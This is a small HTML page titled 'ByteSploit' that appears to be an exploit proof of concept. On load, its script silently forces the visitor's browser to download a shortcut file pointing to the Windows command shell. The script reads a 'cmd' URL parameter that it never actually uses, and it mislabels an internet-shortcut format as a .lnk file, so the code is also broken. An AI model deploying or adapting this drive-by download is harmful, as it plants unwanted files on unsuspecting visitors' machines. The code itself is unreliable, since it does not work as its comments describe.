<!DOCTYPE html>
<html>
<head>
	<title>ByteSploit</title>
</head>
<body>
	<script>
		// Get the ?cmd= argument from the URL
		const urlParams = new URLSearchParams(window.location.search);
		const cmdArg = urlParams.get('cmd');

		// Convert the command from URL friendly to normal characters
		const cmd = decodeURIComponent(cmdArg);

		// Set the content variable to the normal command
		const content = cmd;

		// Create a link element with the download attribute to automatically download the .lnk file
		const link = document.createElement('a');
		link.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent('[InternetShortcut]\nURL=file:///C:/Windows/System32/cmd.exe\nHotkey=162')); // Replace 'C:/Windows/System32/cmd.exe' with the path to cmd.exe on your system
		link.setAttribute('download', 'shortcut.lnk');

		// Append the link element to the body
		document.body.appendChild(link);

		// Simulate a click on the link element to trigger the download
		link.click();
	</script>
</body>
</html>
